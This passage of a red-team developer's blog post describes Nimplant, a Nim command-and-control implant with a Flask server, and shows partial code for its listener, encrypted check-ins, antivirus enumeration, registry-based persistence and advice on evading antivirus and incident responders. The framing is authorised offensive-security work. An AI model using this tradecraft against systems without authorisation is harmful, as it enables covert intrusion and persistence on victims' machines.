adaptation.</li><li>It has to be <strong>functional</strong>. At the very minimum, the implant needs to be able to collect information about a target environment to aid in further operations, such as the domain name and any defensive products that are in use. Preferably, the implant should also allow an operator to deploy further malware stages without the need for re-infection (i.e. phishing a second time).</li></ul><p>Nimplant was designed to fulfil these requirements as efficiently as possible. The design philosophy of Nimplant is quite simple: <strong>&ldquo;evasion through benign functionality&rdquo;</strong>. Many implants have functionality to aid with further exploitation and evasion, such as the option to inject shellcode into other processes, or the usage of direct syscalls to evade defenses. While very useful in practice, employing functionality like this greatly increases the risk of detection.</p><p>The idea behind Nimplant is to only allow functionality that is considered benign and could be applied by legitimate (remote access) tooling. So no shellcode executions, but basic filesystem, WMI, and registry operations instead. This will allow operators to collect the information they need, as well as give them the flexibility to drop further malware or persistence (e.g. through registry run-keys, DLL sideloading, or the classic startup folder). While this limits some of the possibilities for in-memory execution and evasion tradecraft, this is considered an &ldquo;accepted risk&rdquo; for the intents and purposes of Nimplant. This also opens up some possible avenues for detection, which I will discuss towards the end of this post.</p><p>Of course, any tool that we deploy in a client&rsquo;s environment needs to adhere to the highest standards for operational security (&ldquo;opsec&rdquo;). This is especially true since the implant will communicate with a server over the internet - you don&rsquo;t want to inadvertently leak sensitive information on the client&rsquo;s environment out to the internet! Some measures related to opsec are listed in the following sections.</p><h2 id=the-tech-stuff>The Tech Stuff!</h2><p>While all of the above sounds pretty nice, I&rsquo;m sure you didn&rsquo;t come to this blog post for just talk about some theoretical C2 implant. In this section, I will share some of the more interesting technical details of Nimplant, as well as some of the mistakes that I made during development (so you don&rsquo;t have to).</p><p>Like most typical C2, Nimplant functions in a client-server architecture over HTTP(S). Because the implant and server are two components that are quite distinct, we will review both separately.</p><h3 id=the-c2-server>The C2 Server</h3><p>Though I&rsquo;ve been raving about Nim for most of this post, I built the actual C2 server in Python. Reason for this is I&rsquo;m much more comfortable with Python overall, and it&rsquo;s quite a bit more mature as a language than Nim. Though Nim has the several advantages listed earlier in this post, these advantages are less applicable for the server component as it will not be compiled and/or deployed within the client&rsquo;s environment.</p><p>For the web server, I went with Python&rsquo;s <a href=https://palletsprojects.com/p/flask/>Flask</a> framework. Flask is very easy to pick up, and makes it easy to expose endpoints with a variety of functionality. In reality there are two Flask servers running, one supporting the Nimplant listener and one supporting the GUI (see below). At a very high level, the Flask server for Nimplant listener looks like this.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#999;font-style:italic># Define a new Flask server to run in its own thread</span>
+</span></span><span style=display:flex><span><span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>flaskListener</span>():
+</span></span><span style=display:flex><span>    <span style=color:orange>@app</span>.route(registerPath, methods=[<span style=color:#ed9d13>&#39;GET&#39;</span>, <span style=color:#ed9d13>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>getNimplant</span>():
+</span></span><span style=display:flex><span>        <span style=color:#999;font-style:italic># This endpoint is used for Nimplant registration.</span>
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># If a Nimplant matches expected properties, the key exchange will happen.</span>
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># After that, Nimplant will submit it&#39;s (encrypted) registration info.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:orange>@app</span>.route(taskPath, methods=[<span style=color:#ed9d13>&#39;GET&#39;</span>])
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>getTask</span>():
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># This endpoint is used to communicate tasks to Nimplant.</span>
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># It will verify integrity, then return an encrypted task (if available).</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:orange>@app</span>.route(resultPath, methods=[<span style=color:#ed9d13>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>getResult</span>():
+</span></span><span style=display:flex><span>        <span style=color:#999;font-style:italic># This endpoint retrieves and parses encrypted results from Nimplant.</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    app.run(host=listenerIp, port=listenerPort)
+</span></span></code></pre></div><p>You will notice that the actual addresses of endpoints (e.g. <code>www.yourc2.com/register</code>), as well as the server IP and port, are configurable. These properties are parsed from the <code>config.toml</code> file, which is shared between a C2 server and its Nimplants. Because this configuration file is shared, it allows the server to perform integrity checks based on the properties of incoming web requests, such as the User-Agent or HTTP headers. Unexpected requests are dropped, making it harder for incident responders to actually interact with the C2 server.</p><p>Special attention should be paid to the initial key exchange, which happens when a Nimplant first checks in. Since every Nimplant has a unique encryption key associated with it, the server shares this key as part of the <code>getNimplant()</code> function. We don&rsquo;t want to transmit this key in plain-text, even if HTTPS is used. This is because we operate under the assumption that our client has insight into their network traffic by means of a web proxy or similar device that allows for SSL inspection (which is true for most mature clients). As such, the initial key exchange itself is encrypted with a key that is established when the Nimplant is first generated. After this exchange, Nimplant will use its unique key to AES-encrypt all subsequent traffic.</p><p>The C2 server will keep track of Nimplants through the use of classes - every Nimplant corresponds to one instance of the <code>Nimplant</code> class, which has a variety of properties for Nimplant. A snippet of the class, along with some of its helper functions, is as follows.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6ab825;font-weight:700>class</span> <span style=color:#447fcf;text-decoration:underline>NimPlant</span>:
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Initialize a new Nimplant object, use data from config where applicable</span>
+</span></span><span style=display:flex><span>    newId = itertools.count(start=<span style=color:#3677a9>1</span>)
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>def</span> __init__(self):
+</span></span><span style=display:flex><span>        self.id = <span style=color:#24909d>str</span>(<span style=color:#24909d>next</span>(self.newId))
+</span></span><span style=display:flex><span>        self.guid = <span style=color:#ed9d13>&#39;&#39;</span>.join(random.choice(string.ascii_letters + string.digits) <span style=color:#6ab825;font-weight:700>for</span> i <span style=color:#6ab825;font-weight:700>in</span> <span style=color:#24909d>range</span>(<span style=color:#3677a9>8</span>))
+</span></span><span style=display:flex><span>        self.active = <span style=color:#6ab825;font-weight:700>False</span>
+</span></span><span style=display:flex><span>        self.ipAddrExt = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.ipAddrInt = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.username = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.hostname = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.osBuild = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.pid = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.sleepTimeSeconds = sleepTimeSeconds
+</span></span><span style=display:flex><span>        self.killTimeHours = killTimeHours
+</span></span><span style=display:flex><span>        self.firstCheckin = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.lastCheckin = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.task = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.hostingFile = <span style=color:#6ab825;font-weight:700>None</span>
+</span></span><span style=display:flex><span>        self.cryptKey = <span style=color:#999;font-style:italic># secret sauce omitted 👀</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Populate the Nimplant object with information based on first check-in</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>activate</span>(self, ipAddrExt, ipAddrInt, username, hostname, osBuild, pid):
+</span></span><span style=display:flex><span>        self.active = <span style=color:#6ab825;font-weight:700>True</span>
+</span></span><span style=display:flex><span>        self.ipAddrExt = ipAddrExt
+</span></span><span style=display:flex><span>        self.ipAddrInt = ipAddrInt
+</span></span><span style=display:flex><span>        self.username = username
+</span></span><span style=display:flex><span>        self.hostname = hostname
+</span></span><span style=display:flex><span>        self.osBuild = osBuild
+</span></span><span style=display:flex><span>        self.pid = pid
+</span></span><span style=display:flex><span>        self.firstCheckin = timestamp()
+</span></span><span style=display:flex><span>        self.lastCheckin = timestamp()
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># &#39;nimplantPrint&#39; is a custom function to properly direct output to console or a Nimplant&#39;s log</span>
+</span></span><span style=display:flex><span>        nimplantPrint(<span style=color:#ed9d13>f</span><span style=color:#ed9d13>&#34;NimPlant #</span><span style=color:#ed9d13>{</span>self.id<span style=color:#ed9d13>}</span><span style=color:#ed9d13> (</span><span style=color:#ed9d13>{</span>self.guid<span style=color:#ed9d13>}</span><span style=color:#ed9d13>) checked in from </span><span style=color:#ed9d13>{</span>username<span style=color:#ed9d13>}</span><span style=color:#ed9d13>@</span><span style=color:#ed9d13>{</span>hostname<span style=color:#ed9d13>}</span><span style=color:#ed9d13> at &#39;</span><span style=color:#ed9d13>{</span>ipAddrExt<span style=color:#ed9d13>}</span><span style=color:#ed9d13>&#39;!&#34;</span>)
+</span></span><span style=display:flex><span>        nimplantPrint(<span style=color:#ed9d13>f</span><span style=color:#ed9d13>&#34;OS version is </span><span style=color:#ed9d13>{</span>osBuild<span style=color:#ed9d13>}</span><span style=color:#ed9d13>.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Process a &#39;regular&#39; Nimplant check-in</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>checkIn</span>(self):
+</span></span><span style=display:flex><span>        self.lastCheckin = timestamp()
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>if</span> self.task <span style=color:#6ab825;font-weight:700>is</span> <span style=color:#6ab825;font-weight:700>not</span> <span style=color:#6ab825;font-weight:700>None</span>:
+</span></span><span style=display:flex><span>            <span style=color:#6ab825;font-weight:700>if</span> self.task == <span style=color:#ed9d13>&#34;kill&#34;</span>:
+</span></span><span style=display:flex><span>                self.active = <span style=color:#6ab825;font-weight:700>False</span>
+</span></span><span style=display:flex><span>                nimplantPrint(<span style=color:#ed9d13>f</span><span style=color:#ed9d13>&#34;Nimplant #</span><span style=color:#ed9d13>{</span>self.id<span style=color:#ed9d13>}</span><span style=color:#ed9d13> killed.&#34;</span>, self.guid)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Process the result for a certain Nimplant</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>def</span> <span style=color:#447fcf>setResult</span>(self, result):
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>if</span> result == <span style=color:#ed9d13>&#34;NIMPLANT_KILL_TIMER_EXPIRED&#34;</span>:
+</span></span><span style=display:flex><span>            self.active = <span style=color:#6ab825;font-weight:700>False</span>
+</span></span><span style=display:flex><span>            nimplantPrint(<span style=color:#ed9d13>&#34;Nimplant announced self-destruct (kill timer expired). RIP.&#34;</span>, self.guid)
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>            nimplantPrint(result, self.guid)
+</span></span></code></pre></div><p>As you can see, most information about a Nimplant is populated through the <code>activate()</code> function which is triggered on first check-in. There are some checks in the various functions, which for example take care of killing a Nimplant when either the <code>exit</code> or <code>kill</code> commands are provided or the Nimplant&rsquo;s self-destruct timer expired. To keep track of the various Nimplants that have checked in as well as their respective statuses, there is also a <code>NimplantList</code> class available.</p><p>Information from both of these classes is made accessible by an internal API. This API supports both the command-line interface (CLI) and the graphical user interface (GUI), discussed below. Because I focused only on the CLI when I started developing, it was quite a hassle to modify the codebase to support a generic API at a later point. If you&rsquo;re starting a project like this, don&rsquo;t make the mistake that I made: <strong>focus on writing modular and extensible code right from the start!</strong> It may take some more effort, but it will pay out in the long run.</p><p>It goes without saying that the server handles quite a bit more functionality, such as parsing commands, file uploads, cryptographic operations, and logging all executed commands and the resulting output. It is beyond the scope of this blog post to discuss all of that functionality here.</p><h3 id=the-web-interface>The Web Interface</h3><p><em>Before I start bragging about how cool the web interface of Nimplant is, I have to give credit where credit&rsquo;s due: all of the front-end work was done by my colleague <a href=https://github.com/yamakadi>Kadir</a>.</em></p><p>While a CLI to manage implants is cool, a proper C2 needs an interface that supports multiple operators working on multiple implants at the same time. Most frameworks expose a web interface for this purpose, which is exactly what Nimplant does. As mentioned above, a second Flask server is initialized to expose the Nimplant API as well as the web interface.</p><p><img src=/images/nimplant-web.png alt="Nimplant Web Interface"></p><p>The web interface is built with the <a href=https://vuejs.org/>Vue.js</a> framework, supported by <a href=https://tailwindcss.com/>TailwindCSS</a> and some pre-built components from <a href=https://tailwindui.com/>TailwindUI</a>. The interface is completely responsive, and could therefore even be used on mobile devices (for those on-the-go assignments). The front-end communicates with the Nimplant API to retrieve data on the current server configuration and Nimplant status. Each Nimplant has its own console, which is also exposed through the API and shown in the web interface. Of course, operators can submit commands to be executed. They also have the option to see the command history for a Nimplant as well as commands executed by other operators.</p><p><img src=/images/nimplant-webconsole.png alt="Nimplant Web Console"></p><p>As with other C2 frameworks, a high level of care should be taken when exposing this type of interface to the internet. While the C2 listener should be reachable over the internet (preferably behind a redirector to hide the actual infrastructure), the Nimplant web interface should be considered a management interface. As such, it should only be available to a select group of operators, for example from a dedicated VPN.</p><h3 id=the-implant>The Implant</h3><p>While the implant-part of Nimplant is the meat on the bone for the solution, I tried to keep it as &lsquo;slim&rsquo; as possible. Altogether, the implant part is under 1000 lines of Nim code and compiles to a binary of approximately 200KB. Nevertheless, it contains some cool features that operators can use for their &ldquo;stage-1&rdquo; shenanigans. A couple of neat features are highlighted below.</p><p><strong>File operations</strong></p><p>File operations consist of a variety of commands, based on their Linux counterparts. The commands related to file operations in Nimplant include <code>cat</code>, <code>cd</code>, <code>cp</code>, <code>ls</code>, <code>mkdir</code>, <code>mv</code>, <code>pwd</code>, and <code>rm</code>. The implementation of these actually isn&rsquo;t all too interesting, since most functionality is wrapped by Nim&rsquo;s <a href=https://nim-lang.org/docs/os.html>os</a> library.</p><p>The biggest challenge I encountered for (some) of these commands was argument parsing. Take for instance the <code>cp</code> command, which copies a file from one place to another. In principle this is a straight-forward task. However, the command takes a source and destination parameter, the source can be both a file and a folder, and the destination can be both a partial destination (parent folder), or the new file/folder name. The function then becomes something like the following.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>os</span> <span style=color:#6ab825;font-weight:700>import</span> copyDir, copyFile, copyFileToDir, dirExists, splitPath, <span style=color:#a61717;background-color:#e3d2d2>`</span>/<span style=color:#a61717;background-color:#e3d2d2>`</span>
+</span></span><span style=display:flex><span><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> join
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Copy files or directories</span>
+</span></span><span style=display:flex><span>proc cp*(args : varargs[string]) : string =
+</span></span><span style=display:flex><span>    var
+</span></span><span style=display:flex><span>        source : string
+</span></span><span style=display:flex><span>        destination : string
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Parse expected number of arguments (2 or more)</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>if</span> args.len &gt;= <span style=color:#3677a9>2</span>:
+</span></span><span style=display:flex><span>        source = args[<span style=color:#3677a9>0</span>]
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># If &gt;2 arguments are given, join them as the second argument</span>
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># This happens for e.g. an unquoted path with spaces</span>
+</span></span><span style=display:flex><span>        destination = args[<span style=color:#3677a9>1</span> .. ^<span style=color:#3677a9>1</span>].join(<span style=color:#ed9d13>&#34; &#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># Error out if too few arguments are provided</span>
+</span></span><span style=display:flex><span>        result = <span style=color:#ed9d13>&#34;Invalid number of arguments received. Usage: &#39;cp [source] [destination]&#39;.&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#999;font-style:italic># Copying a directory</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>if</span> dirExists(source):
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>if</span> dirExists(destination):
+</span></span><span style=display:flex><span>						<span style=color:#999;font-style:italic># Copy the directory into the existing directory as its current name</span>
+</span></span><span style=display:flex><span>            copyDir(source, destination/splitPath(source).tail)
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>						<span style=color:#999;font-style:italic># Copy the file as the provided directory name</span>
+</span></span><span style=display:flex><span>            copyDir(source, destination)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#999;font-style:italic># Copying a file</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>elif</span> dirExists(destination):
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># Copy the file into the existing directory as its current name</span>
+</span></span><span style=display:flex><span>        copyFileToDir(source, destination)
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>				<span style=color:#999;font-style:italic># Copy the file as the provided filename</span>
+</span></span><span style=display:flex><span>        copyFile(source, destination)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Setting &#39;result&#39; will make the function return with that result in Nim</span>
+</span></span><span style=display:flex><span>    result = <span style=color:#ed9d13>&#34;Copied &#39;&#34;</span> &amp; source &amp; <span style=color:#ed9d13>&#34;&#39; to &#39;&#34;</span> &amp; destination &amp; <span style=color:#ed9d13>&#34;&#39;.&#34;</span>
+</span></span></code></pre></div><p>Note the use of <a href=https://nim-by-example.github.io/varargs/>varargs</a> in the function parameters. This type allows us to receive one to many commands from the C2 server inside of an array, This allows us to parse commands and deal with possible exceptions inside the function itself.</p><p><strong>&lsquo;Whoami&rsquo; command</strong></p><p>While not too interesting on itself, the <code>whoami</code> command provides a nice use case of using benign Windows APIs to achieve your goals. Nimplant&rsquo;s implementation, quite simply, uses the <a href=https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea>GetUserName</a> API to retrieve the user&rsquo;s name.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>winim</span>/lean <span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>GetUserName</span>, <span style=color:#447fcf;text-decoration:underline>LPWSTR</span>, <span style=color:#447fcf;text-decoration:underline>DWORD</span>, <span style=color:#447fcf;text-decoration:underline>TCHAR</span>
+</span></span><span style=display:flex><span><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>winim</span>/utils <span style=color:#6ab825;font-weight:700>import</span> <span style=color:#a61717;background-color:#e3d2d2>`</span>&amp;<span style=color:#a61717;background-color:#e3d2d2>`</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get the current username via the GetUserName API</span>
+</span></span><span style=display:flex><span>proc whoami*() : string =
+</span></span><span style=display:flex><span>    var 
+</span></span><span style=display:flex><span>        buf : array[<span style=color:#3677a9>257</span>, TCHAR] <span style=color:#999;font-style:italic># 257 is UNLEN+1 (max username length plus null terminator)</span>
+</span></span><span style=display:flex><span>        lpBuf :  LPWSTR = addr buf[<span style=color:#3677a9>0</span>]
+</span></span><span style=display:flex><span>        pcbBuf : DWORD = int32(<span style=color:#24909d>len</span>(buf))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># The actual API call</span>
+</span></span><span style=display:flex><span>    discard GetUserName(lpBuf, &amp;pcbBuf)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#999;font-style:italic># Read the buffer into the function result</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>for</span> character <span style=color:#6ab825;font-weight:700>in</span> buf:
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>if</span> character == <span style=color:#3677a9>0</span>: <span style=color:#6ab825;font-weight:700>break</span>
+</span></span><span style=display:flex><span>        result.add(char(character))
+</span></span></code></pre></div><p><a href=https://github.com/khchen/winim>Winim</a> is used to ease the pain of manually defining the right structures and importing the right functions from the Windows API. However, there is one important note to make here regarding OPSEC: Importing full modules from libraries like <code>winim</code> makes it so that your binary becomes bloated with unnecessary function import statements - including imports that can be considered malicious by antivirus. I found that specifically selecting your imports (as shown above) helps reduce the fingerprint of your binary, while increasing overall evasion.</p><p><strong>&lsquo;GetAV&rsquo; command</strong></p><p>The <code>GetAV</code> command is an example of a convenience command I added for operators to more quickly gain a lay of the land once they get a callback from a machine. It&rsquo;s almost equivalent to byt3bl33der&rsquo;s <a href=https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/wmiquery_bin.nim>wmiquery_bin</a> example from OffensiveNim, except it parses the output a bit different. It also serves as a nice example of how easy it is to &lsquo;plug in&rsquo; new commands once you have the base structure of parsing input and output down.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>winim</span>/com
+</span></span><span style=display:flex><span><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> strip
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Get antivirus products on the machine via WMI</span>
+</span></span><span style=display:flex><span>proc getAv*() : string =
+</span></span><span style=display:flex><span>    let wmisec = GetObject(<span style=color:#ed9d13>r</span><span style=color:#ed9d13>&#34;winmgmts:{impersonationLevel=impersonate}!</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>.\root\securitycenter2&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>for</span> avprod <span style=color:#6ab825;font-weight:700>in</span> wmisec.execQuery(<span style=color:#ed9d13>&#34;SELECT displayName FROM AntiVirusProduct</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>):
+</span></span><span style=display:flex><span>        result.add(<span style=color:#a61717;background-color:#e3d2d2>$</span>avprod.displayName &amp; <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>)
+</span></span><span style=display:flex><span>    result = result.strip(trailing = true)
+</span></span></code></pre></div><p>Unfortunately, in this instance we have to import the entire <code>winim/com</code> library, since it exports some types that cannot be imported individually (at least, I didn&rsquo;t find out how).</p><p><strong>&lsquo;Reg&rsquo; command</strong></p><p>The <code>reg</code> command is one of the more complex commands that&rsquo;s included in Nimplant. It builds upon Nim&rsquo;s <a href=https://nim-lang.org/docs/registry.html>registry</a> library to perform registry operations. This library is fairly straight-forward, as it only allows us to get or set variables in the <code>HKCU</code> or <code>HKLM</code> registries, which is fine for the purposes of Nimplant. The relative complexity inside this command comes from the fact that one command supports both reading and writing registry values, so the arguments need to be properly parsed to implement this functionality.</p><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>registry</span>
+</span></span><span style=display:flex><span><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> join, split, startsWith
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#999;font-style:italic># Query or modify the Windows registry</span>
+</span></span><span style=display:flex><span>proc reg*(args : varargs[string]) : string =
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    var
+</span></span><span style=display:flex><span>        command : string
+</span></span><span style=display:flex><span>        path : string
+</span></span><span style=display:flex><span>        key : string
+</span></span><span style=display:flex><span>        value : string
+</span></span><span style=display:flex><span>        handleStr : string
+</span></span><span style=display:flex><span>        regPath : string
+</span></span><span style=display:flex><span>        handle : registry.HKEY
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#999;font-style:italic># Parse arguments</span>
+</span></span><span style=display:flex><span>    case args.len:
+</span></span><span style=display:flex><span>        of <span style=color:#3677a9>2</span>:
+</span></span><span style=display:flex><span>            command = args[<span style=color:#3677a9>0</span>]
+</span></span><span style=display:flex><span>            path = args[<span style=color:#3677a9>1</span>]
+</span></span><span style=display:flex><span>        of <span style=color:#3677a9>3</span>:
+</span></span><span style=display:flex><span>            command = args[<span style=color:#3677a9>0</span>]
+</span></span><span style=display:flex><span>            path = args[<span style=color:#3677a9>1</span>]
+</span></span><span style=display:flex><span>            key = args[<span style=color:#3677a9>2</span>]
+</span></span><span style=display:flex><span>        of <span style=color:#3677a9>4</span>:
+</span></span><span style=display:flex><span>            command = args[<span style=color:#3677a9>0</span>]
+</span></span><span style=display:flex><span>            path = args[<span style=color:#3677a9>1</span>]
+</span></span><span style=display:flex><span>            key = args[<span style=color:#3677a9>2</span>]
+</span></span><span style=display:flex><span>            value = args[<span style=color:#3677a9>3</span> .. ^<span style=color:#3677a9>1</span>].join(<span style=color:#ed9d13>&#34; &#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>            result = <span style=color:#ed9d13>&#34;Invalid number of arguments received. Usage: &#39;reg [query|add] [path] &lt;optional: key&gt; &lt;optional: value&gt;&#39;.&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#6ab825;font-weight:700>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#999;font-style:italic># Parse the registry path</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>try</span>:
+</span></span><span style=display:flex><span>        handleStr = path.split(<span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>&#34;</span>)[<span style=color:#3677a9>0</span>]
+</span></span><span style=display:flex><span>        regPath = path.split(<span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>&#34;</span>, <span style=color:#3677a9>1</span>)[<span style=color:#3677a9>1</span>]
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>except</span>:
+</span></span><span style=display:flex><span>        result = <span style=color:#ed9d13>&#34;Unable to parse registry path. Please use format: &#39;HKCU</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Software</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Microsoft</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Windows</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>CurrentVersion</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Run&#39;.&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#999;font-style:italic># Identify the correct hive from the parsed path</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>if</span> handleStr.startsWith(<span style=color:#ed9d13>&#34;HKCu&#34;</span>):
+</span></span><span style=display:flex><span>        handle = registry.HKEY_CURRENT_USER
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>elif</span> handleStr.startsWith(<span style=color:#ed9d13>&#34;HKLM&#34;</span>):
+</span></span><span style=display:flex><span>        handle = registry.HKEY_LOCAL_MACHINE
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>else</span>:
+</span></span><span style=display:flex><span>        result = <span style=color:#ed9d13>&#34;Invalid registry. Only &#39;HKCU&#39; and &#39;HKLM&#39; are supported at this time.&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#6ab825;font-weight:700>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#999;font-style:italic># Query an existing registry value</span>
+</span></span><span style=display:flex><span>    <span style=color:#6ab825;font-weight:700>if</span> command == <span style=color:#ed9d13>&#34;query&#34;</span>:
+</span></span><span style=display:flex><span>        result = getUnicodeValue(regPath, key, handle)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#999;font-style:italic># Add a value to the registry</span>
